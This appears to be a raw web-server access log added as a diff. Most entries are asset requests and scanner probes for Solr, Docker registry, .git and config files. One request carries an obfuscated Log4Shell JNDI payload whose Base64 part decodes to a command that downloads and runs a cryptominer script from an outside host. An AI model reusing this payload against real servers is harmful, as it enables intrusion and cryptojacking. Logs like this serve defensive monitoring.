+INFO:     172.232.195.38:24274 - "GET /query?q=SHOW+DIAGNOSTICS HTTP/1.1" 404 Not Found
+INFO:     172.232.195.22:63420 - "GET / HTTP/1.1" 200 OK
+INFO:     52.76.71.100:20474 - "GET /assets/logo.png HTTP/1.1" 200 OK
+INFO:     172.232.195.111:10808 - "GET /solr/admin/cores?action=STATUS&wt=json HTTP/1.1" 404 Not Found
+INFO:     220.196.160.124:35606 - "GET /query?q=SHOW+DIAGNOSTICS HTTP/1.1" 404 Not Found
+INFO:     220.196.160.151:18180 - "GET /solr/admin/info/system HTTP/1.1" 404 Not Found
+INFO:     220.196.160.95:28486 - "GET /v2/_catalog HTTP/1.1" 404 Not Found
+INFO:     167.94.146.53:54144 - "GET / HTTP/1.1" 200 OK
+INFO:     167.94.146.53:47496 - "GET / HTTP/1.1" 200 OK
+INFO:     167.94.146.53:47516 - "GET /assets/logo.png HTTP/1.1" 200 OK
+INFO:     167.94.146.53:47554 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     172.232.195.31:14181 - "GET / HTTP/1.0" 200 OK
+INFO:     172.232.195.151:57582 - "GET /query?q=SHOW+DIAGNOSTICS HTTP/1.1" 404 Not Found
+INFO:     172.232.195.151:57568 - "GET /cgi-bin/authLogin.cgi HTTP/1.1" 404 Not Found
+INFO:     172.232.195.111:19674 - "GET /v2/_catalog HTTP/1.1" 404 Not Found
+INFO:     172.232.194.179:20150 - "GET /solr/admin/info/system HTTP/1.1" 404 Not Found
+INFO:     172.232.195.15:47818 - "GET / HTTP/1.1" 200 OK
+INFO:     172.232.194.179:20166 - "GET /solr/admin/cores?action=STATUS&wt=json HTTP/1.1" 404 Not Found
+INFO:     52.76.71.100:51444 - "GET /assets/logo.png HTTP/1.1" 200 OK
+INFO:     172.232.195.21:28313 - "GET / HTTP/1.0" 200 OK
+INFO:     172.232.195.124:30998 - "GET / HTTP/1.1" 200 OK
+INFO:     172.232.195.151:28622 - "GET /solr/admin/info/system HTTP/1.1" 404 Not Found
+INFO:     172.232.194.179:52966 - "GET /v2/_catalog HTTP/1.1" 404 Not Found
+INFO:     172.232.195.15:31472 - "GET /query?q=SHOW+DIAGNOSTICS HTTP/1.1" 404 Not Found
+INFO:     172.232.195.151:28660 - "GET /solr/admin/cores?action=STATUS&wt=json HTTP/1.1" 404 Not Found
+INFO:     52.76.71.100:48223 - "GET /assets/logo.png HTTP/1.1" 200 OK
+INFO:     172.232.194.179:52974 - "GET /cgi-bin/authLogin.cgi HTTP/1.1" 404 Not Found
+INFO:     13.64.194.111:38404 - "GET / HTTP/1.1" 200 OK
+INFO:     220.196.160.154:59644 - "GET / HTTP/1.1" 200 OK
+INFO:     220.196.160.154:59644 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     220.196.160.101:28796 - "GET /assets/vendor.js HTTP/1.1" 200 OK
+INFO:     220.196.160.124:21952 - "GET /assets/index.css HTTP/1.1" 200 OK
+INFO:     220.196.160.117:30818 - "GET /assets/uuid.js HTTP/1.1" 200 OK
+INFO:     220.196.160.83:45812 - "GET /assets/pdfjs-dist.js HTTP/1.1" 200 OK
+INFO:     220.196.160.76:50436 - "GET / HTTP/1.1" 200 OK
+INFO:     106.55.201.50:53241 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     180.101.245.248:54900 - "GET / HTTP/1.1" 200 OK
+INFO:     180.101.245.248:54900 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     59.83.208.107:53194 - "GET /assets/vendor.js HTTP/1.1" 200 OK
+INFO:     180.101.244.14:40644 - "GET /assets/index.css HTTP/1.1" 200 OK
+INFO:     59.83.208.103:45704 - "GET /assets/uuid.js HTTP/1.1" 200 OK
+INFO:     180.101.244.12:57316 - "GET /assets/pdfjs-dist.js HTTP/1.1" 200 OK
+INFO:     47.92.198.85:57966 - "GET / HTTP/1.0" 200 OK
+INFO:     47.92.153.248:48868 - "GET / HTTP/1.0" 200 OK
+INFO:     180.101.245.253:19688 - "GET / HTTP/1.1" 200 OK
+INFO:     180.101.245.253:19688 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     59.83.208.104:32434 - "GET /assets/vendor.js HTTP/1.1" 200 OK
+INFO:     180.101.244.15:51712 - "GET /assets/pdfjs-dist.js HTTP/1.1" 200 OK
+INFO:     180.101.245.246:30568 - "GET /assets/uuid.js HTTP/1.1" 200 OK
+INFO:     180.101.244.14:59288 - "GET /assets/index.css HTTP/1.1" 200 OK
+INFO:     173.255.221.189:53876 - "GET / HTTP/1.1" 200 OK
+INFO:     192.155.90.118:10192 - "GET / HTTP/1.1" 200 OK
+INFO:     220.196.160.124:50072 - "GET / HTTP/1.1" 200 OK
+INFO:     49.234.27.58:47922 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     220.196.160.53:41980 - "GET / HTTP/1.1" 200 OK
+INFO:     106.55.200.45:5005 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     220.196.160.45:19076 - "GET / HTTP/1.1" 200 OK
+INFO:     220.196.160.45:19076 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     220.196.160.151:26474 - "GET /assets/index.css HTTP/1.1" 200 OK
+INFO:     220.196.160.125:20046 - "GET /assets/uuid.js HTTP/1.1" 200 OK
+INFO:     220.196.160.154:26946 - "GET /assets/vendor.js HTTP/1.1" 200 OK
+INFO:     220.196.160.146:45976 - "GET /assets/pdfjs-dist.js HTTP/1.1" 200 OK
+INFO:     118.123.105.92:46036 - "GET / HTTP/1.0" 200 OK
+INFO:     118.123.105.92:47124 - "GET /assets/logo.png HTTP/1.1" 200 OK
+INFO:     118.123.105.92:47574 - "GET /robots.txt HTTP/1.1" 404 Not Found
+INFO:     118.123.105.92:48458 - "GET /.well-known/security.txt HTTP/1.1" 404 Not Found
+INFO:     114.132.202.163:30182 - "GET /assets/logo.png HTTP/1.1" 200 OK
+INFO:     23.95.200.178:51144 - "GET / HTTP/1.1" 200 OK
+INFO:     220.196.160.83:46782 - "GET / HTTP/1.1" 200 OK
+INFO:     49.234.27.58:11215 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     180.101.245.251:55142 - "GET / HTTP/1.1" 200 OK
+INFO:     180.101.245.251:55142 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     180.101.244.14:46232 - "GET /assets/vendor.js HTTP/1.1" 200 OK
+INFO:     180.101.245.248:60494 - "GET /assets/pdfjs-dist.js HTTP/1.1" 200 OK
+INFO:     180.101.244.14:46234 - "GET /assets/index.css HTTP/1.1" 200 OK
+INFO:     180.101.244.12:54216 - "GET /assets/uuid.js HTTP/1.1" 200 OK
+INFO:     220.196.160.83:46794 - "GET / HTTP/1.1" 200 OK
+INFO:     106.55.200.45:12409 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     220.196.160.61:16764 - "GET / HTTP/1.1" 200 OK
+INFO:     220.196.160.61:16764 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     220.196.160.96:31798 - "GET /assets/index.css HTTP/1.1" 200 OK
+INFO:     220.196.160.45:27754 - "GET /assets/uuid.js HTTP/1.1" 200 OK
+INFO:     220.196.160.75:21868 - "GET /assets/vendor.js HTTP/1.1" 200 OK
+INFO:     220.196.160.51:46740 - "GET /assets/pdfjs-dist.js HTTP/1.1" 200 OK
+INFO:     103.56.61.144:43060 - "GET / HTTP/1.0" 200 OK
+INFO:     103.56.61.144:43066 - "GET /assets/logo.png HTTP/1.1" 200 OK
+INFO:     103.56.61.144:43078 - "GET /robots.txt HTTP/1.1" 404 Not Found
+INFO:     103.56.61.144:43082 - "GET /.well-known/security.txt HTTP/1.1" 404 Not Found
+INFO:     206.168.34.41:43938 - "GET / HTTP/1.1" 200 OK
+INFO:     206.168.34.41:43958 - "GET /assets/logo.png HTTP/1.1" 200 OK
+INFO:     206.168.34.41:43968 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     220.196.160.101:24816 - "GET / HTTP/1.1" 200 OK
+INFO:     49.234.34.31:53698 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     180.101.244.15:55972 - "GET / HTTP/1.1" 200 OK
+INFO:     180.101.244.15:55972 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     180.101.244.13:18136 - "GET /assets/index.css HTTP/1.1" 200 OK
+INFO:     180.101.244.15:56040 - "GET /assets/vendor.js HTTP/1.1" 200 OK
+INFO:     180.101.244.15:56044 - "GET /assets/pdfjs-dist.js HTTP/1.1" 200 OK
+INFO:     180.101.245.248:20284 - "GET /assets/uuid.js HTTP/1.1" 200 OK
+INFO:     59.83.208.103:35796 - "GET / HTTP/1.1" 200 OK
+INFO:     49.234.27.58:53215 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     180.101.245.251:35580 - "GET / HTTP/1.1" 200 OK
+INFO:     180.101.245.251:35580 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     180.101.245.253:44976 - "GET /assets/uuid.js HTTP/1.1" 200 OK
+INFO:     59.83.208.103:35950 - "GET /assets/pdfjs-dist.js HTTP/1.1" 200 OK
+INFO:     59.83.208.105:41538 - "GET /assets/vendor.js HTTP/1.1" 200 OK
+INFO:     180.101.245.246:60448 - "GET /assets/index.css HTTP/1.1" 200 OK
+INFO:     220.196.160.125:44118 - "GET / HTTP/1.1" 200 OK
+INFO:     49.234.27.58:43727 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     180.101.244.13:18872 - "GET / HTTP/1.1" 200 OK
+INFO:     180.101.244.13:18872 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     59.83.208.103:29006 - "GET /assets/index.css HTTP/1.1" 200 OK
+INFO:     59.83.208.104:40804 - "GET /assets/uuid.js HTTP/1.1" 200 OK
+INFO:     59.83.208.108:46750 - "GET /assets/pdfjs-dist.js HTTP/1.1" 200 OK
+INFO:     180.101.244.12:49512 - "GET /assets/vendor.js HTTP/1.1" 200 OK
+INFO:     152.32.251.44:48842 - "GET / HTTP/1.1" 200 OK
+INFO:     152.32.251.44:48856 - "GET /assets/logo.png HTTP/1.1" 200 OK
+INFO:     152.32.251.44:48862 - "GET /robots.txt HTTP/1.1" 404 Not Found
+INFO:     152.32.251.44:48872 - "GET /sitemap.xml HTTP/1.1" 404 Not Found
+INFO:     152.32.251.44:48880 - "GET /assets/uuid.js HTTP/1.1" 200 OK
+INFO:     152.32.251.44:48894 - "GET /assets/vendor.js HTTP/1.1" 200 OK
+INFO:     152.32.251.44:48904 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     152.32.251.44:48908 - "GET /assets/pdfjs-dist.js HTTP/1.1" 200 OK
+INFO:     152.32.251.44:35702 - "GET /config.json HTTP/1.1" 404 Not Found
+INFO:     180.101.244.14:35018 - "GET / HTTP/1.1" 200 OK
+INFO:     175.24.213.48:48969 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     220.196.160.151:60202 - "GET / HTTP/1.1" 200 OK
+INFO:     220.196.160.151:60202 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     220.196.160.83:27662 - "GET /assets/uuid.js HTTP/1.1" 200 OK
+INFO:     220.196.160.96:20818 - "GET /assets/pdfjs-dist.js HTTP/1.1" 200 OK
+INFO:     220.196.160.95:58026 - "GET /assets/index.css HTTP/1.1" 200 OK
+INFO:     220.196.160.45:17082 - "GET /assets/vendor.js HTTP/1.1" 200 OK
+INFO:     172.168.41.193:59552 - "GET / HTTP/1.1" 200 OK
+INFO:     129.211.167.166:50056 - "GET / HTTP/1.1" 200 OK
+INFO:     220.196.160.45:41810 - "GET / HTTP/1.1" 200 OK
+INFO:     106.55.202.193:12424 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     106.55.202.193:1672 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     220.196.160.75:35496 - "GET / HTTP/1.1" 200 OK
+INFO:     220.196.160.125:43102 - "GET / HTTP/1.1" 200 OK
+INFO:     220.196.160.75:35496 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     220.196.160.75:35524 - "GET /assets/vendor.js HTTP/1.1" 200 OK
+INFO:     220.196.160.76:39204 - "GET /assets/pdfjs-dist.js HTTP/1.1" 200 OK
+INFO:     220.196.160.83:21522 - "GET /assets/uuid.js HTTP/1.1" 200 OK
+INFO:     220.196.160.144:31456 - "GET /assets/index.css HTTP/1.1" 200 OK
+INFO:     220.196.160.125:43102 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     220.196.160.117:32772 - "GET /assets/index.css HTTP/1.1" 200 OK
+INFO:     220.196.160.117:32778 - "GET /assets/pdfjs-dist.js HTTP/1.1" 200 OK
+INFO:     220.196.160.61:27562 - "GET /assets/vendor.js HTTP/1.1" 200 OK
+INFO:     220.196.160.51:60440 - "GET /assets/uuid.js HTTP/1.1" 200 OK
+INFO:     87.236.176.121:41443 - "GET / HTTP/1.1" 200 OK
+INFO:     87.236.176.113:56719 - "GET /assets/logo.png HTTP/1.1" 200 OK
+INFO:     59.83.208.104:18056 - "GET / HTTP/1.1" 200 OK
+INFO:     106.55.202.193:56100 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     59.83.208.103:53904 - "GET / HTTP/1.1" 200 OK
+INFO:     59.83.208.103:53904 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     180.101.245.247:22660 - "GET /assets/vendor.js HTTP/1.1" 200 OK
+INFO:     180.101.244.13:38114 - "GET /assets/uuid.js HTTP/1.1" 200 OK
+INFO:     180.101.245.247:22662 - "GET /assets/index.css HTTP/1.1" 200 OK
+INFO:     180.101.244.15:54766 - "GET /assets/pdfjs-dist.js HTTP/1.1" 200 OK
+INFO:     154.212.141.182:48418 - "GET / HTTP/1.1" 200 OK
+INFO:     220.196.160.83:34170 - "GET / HTTP/1.1" 200 OK
+INFO:     106.55.202.193:24085 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     220.196.160.45:40488 - "GET / HTTP/1.1" 200 OK
+INFO:     220.196.160.45:40488 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     220.196.160.151:46726 - "GET /assets/pdfjs-dist.js HTTP/1.1" 200 OK
+INFO:     220.196.160.76:54878 - "GET /assets/index.css HTTP/1.1" 200 OK
+INFO:     220.196.160.75:16364 - "GET /assets/uuid.js HTTP/1.1" 200 OK
+INFO:     220.196.160.117:33218 - "GET /assets/vendor.js HTTP/1.1" 200 OK
+INFO:     185.242.226.42:47448 - "GET / HTTP/1.1" 200 OK
+INFO:     167.94.146.52:53584 - "GET / HTTP/1.1" 200 OK
+INFO:     167.94.146.52:43646 - "GET / HTTP/1.1" 200 OK
+INFO:     167.94.146.52:33152 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     206.168.34.118:36914 - "GET / HTTP/1.1" 200 OK
+INFO:     206.168.34.118:36922 - "GET /assets/logo.png HTTP/1.1" 200 OK
+INFO:     206.168.34.118:36938 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     129.211.162.158:11595 - "GET / HTTP/1.1" 200 OK
+INFO:     59.83.208.107:53344 - "GET / HTTP/1.1" 200 OK
+INFO:     49.234.27.58:45261 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     106.55.200.233:56013 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     220.196.160.96:17700 - "GET / HTTP/1.1" 200 OK
+INFO:     180.101.244.15:34678 - "GET / HTTP/1.1" 200 OK
+INFO:     220.196.160.96:17700 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     180.101.244.15:34678 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     220.196.160.65:21238 - "GET /assets/index.css HTTP/1.1" 200 OK
+INFO:     220.196.160.75:34848 - "GET /assets/vendor.js HTTP/1.1" 200 OK
+INFO:     220.196.160.75:34850 - "GET /assets/uuid.js HTTP/1.1" 200 OK
+INFO:     220.196.160.45:38922 - "GET /assets/pdfjs-dist.js HTTP/1.1" 200 OK
+INFO:     59.83.208.105:51406 - "GET /assets/vendor.js HTTP/1.1" 200 OK
+INFO:     129.211.162.158:61389 - "GET /assets/uuid.js HTTP/1.1" 200 OK
+INFO:     180.101.245.248:45366 - "GET /assets/pdfjs-dist.js HTTP/1.1" 200 OK
+INFO:     180.101.244.13:50082 - "GET /assets/index.css HTTP/1.1" 200 OK
+INFO:     172.232.194.51:30969 - "GET / HTTP/1.0" 200 OK
+INFO:     172.232.216.67:23508 - "GET /solr/admin/info/system HTTP/1.1" 404 Not Found
+INFO:     172.232.216.67:23524 - "GET /solr/admin/cores?action=STATUS&wt=json HTTP/1.1" 404 Not Found
+INFO:     172.232.208.48:48184 - "GET /query?q=SHOW+DIAGNOSTICS HTTP/1.1" 404 Not Found
+INFO:     172.232.208.224:28430 - "GET /v2/_catalog HTTP/1.1" 404 Not Found
+INFO:     172.232.216.83:50884 - "GET /cgi-bin/authLogin.cgi HTTP/1.1" 404 Not Found
+INFO:     172.232.218.129:19570 - "GET / HTTP/1.1" 200 OK
+INFO:     52.76.71.100:65231 - "GET /assets/logo.png HTTP/1.1" 200 OK
+INFO:     52.76.71.100:37076 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     220.196.160.95:36076 - "GET /v2/_catalog HTTP/1.1" 404 Not Found
+INFO:     172.232.194.149:3629 - "GET / HTTP/1.0" 200 OK
+INFO:     172.232.218.129:17736 - "GET /query?q=SHOW+DIAGNOSTICS HTTP/1.1" 404 Not Found
+INFO:     172.232.216.67:63430 - "GET /v2/_catalog HTTP/1.1" 404 Not Found
+INFO:     172.232.208.224:52538 - "GET /solr/admin/info/system HTTP/1.1" 404 Not Found
+INFO:     172.232.208.224:52564 - "GET /solr/admin/cores?action=STATUS&wt=json HTTP/1.1" 404 Not Found
+INFO:     172.232.208.224:52550 - "GET / HTTP/1.1" 200 OK
+INFO:     172.232.218.129:17752 - "GET /cgi-bin/authLogin.cgi HTTP/1.1" 404 Not Found
+INFO:     59.83.208.103:31982 - "GET /solr/admin/info/system HTTP/1.1" 404 Not Found
+INFO:     220.196.160.117:18926 - "GET / HTTP/1.1" 200 OK
+INFO:     106.55.202.186:63910 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     220.196.160.154:37686 - "GET / HTTP/1.1" 200 OK
+INFO:     220.196.160.154:37686 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     220.196.160.51:41558 - "GET /assets/uuid.js HTTP/1.1" 200 OK
+INFO:     220.196.160.151:23830 - "GET /assets/pdfjs-dist.js HTTP/1.1" 200 OK
+INFO:     220.196.160.117:19766 - "GET /assets/vendor.js HTTP/1.1" 200 OK
+INFO:     220.196.160.84:54582 - "GET /assets/index.css HTTP/1.1" 200 OK
+INFO:     220.196.160.75:42980 - "GET /query?q=SHOW+DIAGNOSTICS HTTP/1.1" 404 Not Found
+INFO:     199.45.154.114:48044 - "GET / HTTP/1.1" 200 OK
+INFO:     59.83.208.107:43490 - "GET / HTTP/1.1" 200 OK
+INFO:     49.234.3.160:36358 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     180.101.244.14:29134 - "GET / HTTP/1.1" 200 OK
+INFO:     180.101.244.14:29134 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     59.83.208.104:40092 - "GET /assets/uuid.js HTTP/1.1" 200 OK
+INFO:     180.101.244.14:29190 - "GET /assets/index.css HTTP/1.1" 200 OK
+INFO:     180.101.245.248:39402 - "GET /assets/pdfjs-dist.js HTTP/1.1" 200 OK
+INFO:     180.101.245.250:58446 - "GET /assets/vendor.js HTTP/1.1" 200 OK
+INFO:     59.83.208.108:55288 - "GET / HTTP/1.1" 200 OK
+INFO:     59.83.208.108:55288 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     180.101.244.16:55322 - "GET /assets/index.css HTTP/1.1" 200 OK
+INFO:     59.83.208.108:55332 - "GET /assets/pdfjs-dist.js HTTP/1.1" 200 OK
+INFO:     180.101.245.252:29196 - "GET /assets/vendor.js HTTP/1.1" 200 OK
+INFO:     180.101.244.12:49626 - "GET /assets/uuid.js HTTP/1.1" 200 OK
+INFO:     162.142.125.220:60620 - "GET / HTTP/1.1" 200 OK
+INFO:     162.142.125.220:35054 - "GET / HTTP/1.1" 200 OK
+INFO:     162.142.125.220:35058 - "GET /assets/logo.png HTTP/1.1" 200 OK
+INFO:     162.142.125.220:35072 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     47.92.81.99:44140 - "GET / HTTP/1.0" 200 OK
+INFO:     167.94.145.99:55500 - "GET / HTTP/1.1" 200 OK
+INFO:     167.94.145.99:55594 - "GET / HTTP/1.1" 200 OK
+INFO:     167.94.145.99:35280 - "GET /assets/logo.png HTTP/1.1" 200 OK
+INFO:     167.94.145.99:35294 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     220.196.160.83:36284 - "GET / HTTP/1.1" 200 OK
+INFO:     49.234.35.33:35412 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     180.101.245.250:19298 - "GET / HTTP/1.1" 200 OK
+INFO:     180.101.245.250:19298 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     180.101.244.14:58682 - "GET /assets/index.css HTTP/1.1" 200 OK
+INFO:     59.83.208.106:55300 - "GET /assets/uuid.js HTTP/1.1" 200 OK
+INFO:     180.101.244.12:55078 - "GET /assets/vendor.js HTTP/1.1" 200 OK
+INFO:     180.101.245.250:19332 - "GET /assets/pdfjs-dist.js HTTP/1.1" 200 OK
+INFO:     167.94.138.37:52412 - "GET / HTTP/1.1" 200 OK
+INFO:     167.94.138.37:38748 - "GET / HTTP/1.1" 200 OK
+INFO:     167.94.138.37:38750 - "GET /assets/logo.png HTTP/1.1" 200 OK
+INFO:     167.94.138.37:38758 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     87.236.176.55:56317 - "GET / HTTP/1.1" 200 OK
+INFO:     87.236.176.120:38343 - "GET /assets/logo.png HTTP/1.1" 200 OK
+INFO:     152.32.158.96:60622 - "GET / HTTP/1.1" 200 OK
+INFO:     152.32.158.96:60634 - "GET /assets/logo.png HTTP/1.1" 200 OK
+INFO:     152.32.158.96:60648 - "GET /robots.txt HTTP/1.1" 404 Not Found
+INFO:     152.32.158.96:39478 - "GET /sitemap.xml HTTP/1.1" 404 Not Found
+INFO:     152.32.158.96:39484 - "GET /config.json HTTP/1.1" 404 Not Found
+INFO:     114.132.203.162:53754 - "GET /assets/logo.png HTTP/1.1" 200 OK
+INFO:     59.36.125.14:37542 - "GET /assets/logo.png HTTP/1.1" 200 OK
+INFO:     167.94.145.97:39624 - "GET / HTTP/1.1" 200 OK
+INFO:     167.94.145.97:51334 - "GET / HTTP/1.1" 200 OK
+INFO:     167.94.145.97:51372 - "GET /assets/logo.png HTTP/1.1" 200 OK
+INFO:     167.94.145.97:51400 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     220.196.160.51:30028 - "GET / HTTP/1.1" 200 OK
+INFO:     106.55.202.186:3282 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     220.196.160.101:55992 - "GET / HTTP/1.1" 200 OK
+INFO:     220.196.160.101:55992 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     220.196.160.125:36666 - "GET /assets/index.css HTTP/1.1" 200 OK
+INFO:     220.196.160.51:30034 - "GET /assets/uuid.js HTTP/1.1" 200 OK
+INFO:     220.196.160.151:58796 - "GET /assets/vendor.js HTTP/1.1" 200 OK
+INFO:     220.196.160.124:60502 - "GET /assets/pdfjs-dist.js HTTP/1.1" 200 OK
+INFO:     180.101.244.14:44302 - "GET / HTTP/1.1" 200 OK
+INFO:     106.55.200.233:18681 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     129.211.162.87:55791 - "GET / HTTP/1.1" 200 OK
+INFO:     129.211.162.87:55791 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     129.211.167.166:58075 - "GET /assets/pdfjs-dist.js HTTP/1.1" 200 OK
+INFO:     59.83.208.108:56064 - "GET /assets/uuid.js HTTP/1.1" 200 OK
+INFO:     59.83.208.108:56062 - "GET /assets/vendor.js HTTP/1.1" 200 OK
+INFO:     180.101.244.16:59436 - "GET /assets/index.css HTTP/1.1" 200 OK
+INFO:     185.91.127.9:49848 - "GET /t%28%27%24%7B%24%7Benv%3ANaN%3A-j%7Dndi%24%7Benv%3ANaN%3A-%3A%7D%24%7Benv%3ANaN%3A-l%7Ddap%24%7Benv%3ANaN%3A-%3A%7D//54.37.131.59%3A3306/TomcatBypass/Command/Base64/Y3VybCAtcyAtTCBodHRwOi8vZG93bmxvYWQuNHRoZXBvb2wudG9wL3NldHVwXzR0aGVwb29sX21pbmVyLnNoIHwgTENfQUxMPWVuX1VTLlVURi04IGJhc2ggLXMgNDk5YTZMTXZhbVdjdXFuVzd3bU1oNWlmTDFWU3o5YzNZUXAyUGNiQURGUDRhcjZhZDVldlBWUmV3QmZGcUhIUE5YVzRvclZlQVUxcmFVek1lVmZCUVozdFRwOEtaTEo%3D%7D%27%29 HTTP/1.1" 404 Not Found
+INFO:     49.232.239.155:45080 - "GET / HTTP/1.0" 200 OK
+INFO:     49.232.239.155:58614 - "GET / HTTP/1.1" 200 OK
+INFO:     49.232.239.155:58624 - "GET /assets/logo.png HTTP/1.1" 200 OK
+INFO:     180.101.245.252:17966 - "GET / HTTP/1.1" 200 OK
+INFO:     106.55.202.186:25535 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     129.211.162.158:9407 - "GET / HTTP/1.1" 200 OK
+INFO:     129.211.162.158:9407 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     129.211.167.166:62358 - "GET /assets/index.css HTTP/1.1" 200 OK
+INFO:     180.101.244.12:60060 - "GET /assets/pdfjs-dist.js HTTP/1.1" 200 OK
+INFO:     180.101.244.13:29362 - "GET /assets/vendor.js HTTP/1.1" 200 OK
+INFO:     180.101.245.252:17982 - "GET /assets/uuid.js HTTP/1.1" 200 OK
+INFO:     129.211.162.158:41861 - "GET / HTTP/1.1" 200 OK
+INFO:     175.24.211.44:25733 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     180.101.245.246:46508 - "GET / HTTP/1.1" 200 OK
+INFO:     180.101.245.246:46508 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     180.101.245.253:42828 - "GET /assets/index.css HTTP/1.1" 200 OK
+INFO:     180.101.245.252:32708 - "GET /assets/vendor.js HTTP/1.1" 200 OK
+INFO:     59.83.208.108:21410 - "GET /assets/pdfjs-dist.js HTTP/1.1" 200 OK
+INFO:     180.101.244.13:40922 - "GET /assets/uuid.js HTTP/1.1" 200 OK
+INFO:     167.94.146.63:45488 - "GET / HTTP/1.1" 200 OK
+INFO:     167.94.146.63:45496 - "GET / HTTP/1.1" 200 OK
+INFO:     167.94.146.63:45504 - "GET /assets/logo.png HTTP/1.1" 200 OK
+INFO:     167.94.146.63:45512 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     180.101.244.13:27272 - "GET / HTTP/1.1" 200 OK
+INFO:     175.24.211.44:31452 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     220.196.160.83:60570 - "GET / HTTP/1.1" 200 OK
+INFO:     106.55.200.246:36679 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     180.101.245.250:49134 - "GET / HTTP/1.1" 200 OK
+INFO:     180.101.245.250:49134 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     180.101.244.13:27404 - "GET /assets/index.css HTTP/1.1" 200 OK
+INFO:     59.83.208.107:27804 - "GET /assets/pdfjs-dist.js HTTP/1.1" 200 OK
+INFO:     59.83.208.103:38906 - "GET /assets/uuid.js HTTP/1.1" 200 OK
+INFO:     180.101.245.247:51872 - "GET /assets/vendor.js HTTP/1.1" 200 OK
+INFO:     59.83.208.103:38952 - "GET / HTTP/1.1" 200 OK
+INFO:     59.83.208.103:38952 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     59.83.208.105:20382 - "GET /assets/vendor.js HTTP/1.1" 200 OK
+INFO:     180.101.245.247:51956 - "GET /assets/uuid.js HTTP/1.1" 200 OK
+INFO:     180.101.244.16:43212 - "GET /assets/index.css HTTP/1.1" 200 OK
+INFO:     180.101.245.247:51960 - "GET /assets/pdfjs-dist.js HTTP/1.1" 200 OK
+INFO:     47.92.65.140:37728 - "GET / HTTP/1.0" 200 OK
+INFO:     47.92.65.140:43900 - "GET /nice%20ports%2C/Trinity.txt.bak HTTP/1.0" 404 Not Found
+INFO:     47.92.65.140:43906 - "OPTIONS / HTTP/1.0" 405 Method Not Allowed
+INFO:     47.92.65.140:43916 - "OPTIONS / HTTP/1.0" 405 Method Not Allowed
+INFO:     47.92.65.140:58384 - "GET /.git/HEAD HTTP/1.1" 404 Not Found
+INFO:     47.92.65.140:58398 - "GET /Portal0000.htm HTTP/1.1" 404 Not Found
+INFO:     47.92.65.140:58368 - "GET / HTTP/1.1" 200 OK
+INFO:     47.92.65.140:58418 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     47.92.65.140:58402 - "GET / HTTP/1.1" 200 OK
+INFO:     47.92.65.140:58426 - "GET /__Additional HTTP/1.1" 404 Not Found
+INFO:     47.92.65.140:58444 - "GET /Portal/Portal.mwsl HTTP/1.1" 404 Not Found
+INFO:     47.92.65.140:58436 - "GET /CSS/Miniweb.css HTTP/1.1" 404 Not Found
+INFO:     47.92.65.140:58452 - "GET /?=PHPE9568F36-D428-11d2-A769-00AA001ACF42 HTTP/1.1" 200 OK
+INFO:     47.92.65.140:58476 - "GET /docs/cplugError.html/ HTTP/1.1" 404 Not Found
